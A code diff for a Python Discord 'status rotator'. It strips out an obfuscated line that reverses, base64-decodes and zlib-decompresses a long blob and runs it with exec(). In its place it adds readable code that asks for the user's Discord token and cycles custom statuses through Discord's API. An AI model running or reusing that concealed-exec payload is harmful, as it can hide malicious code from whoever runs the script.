@@ -1,4 +1,68 @@
+import time
+import datetime
+import os
+import threading
+import requests
 
-# Python obfuscation by freecodingtools.org
-                    
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'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'))
+# === COLORS ===
+PINK = '\033[95m'
+RESET = '\033[0m'
+
+def get_time():
+    return f"{PINK}[{datetime.datetime.now().strftime('%H:%M:%S')}]{RESET}"
+
+os.system('cls' if os.name == 'nt' else 'clear')
+print(f"{PINK} SectorX - Status Rotator {RESET}\n")
+
+# Ask how many statuses
+try:
+    total = int(input("How many statuses you want? "))
+except:
+    print("Invalid number")
+    exit()
+
+statuses = []
+for i in range(total):
+    text = input(f"{PINK}Status > {RESET}")
+    statuses.append(text)
+
+# Delay
+try:
+    delay = int(input("\nDelay? (in seconds) >  "))
+except:
+    delay = 10
+
+# Token
+token = input("Enter your USER token: ")
+
+# Headers for requests
+headers = {
+    'Authorization': token,
+    'Content-Type': 'application/json'
+}
+
+url = 'https://discord.com/api/v9/users/@me/settings'
+
+def set_status(text):
+    payload = {
+        "custom_status": {
+            "text": text
+        }
+    }
+    try:
+        r = requests.patch(url, json=payload, headers=headers)
+        if r.status_code == 200:
+            print(f"{get_time()} > Changed to: {text}")
+        else:
+            print(f"{get_time()} > Failed: {r.status_code} | {r.text}")
+    except Exception as e:
+        print(f"{get_time()} > ERROR: {e}")
+
+def rotator():
+    while True:
+        for status in statuses:
+            set_status(status)
+            time.sleep(delay)
+
+# Run
+threading.Thread(target=rotator).start()
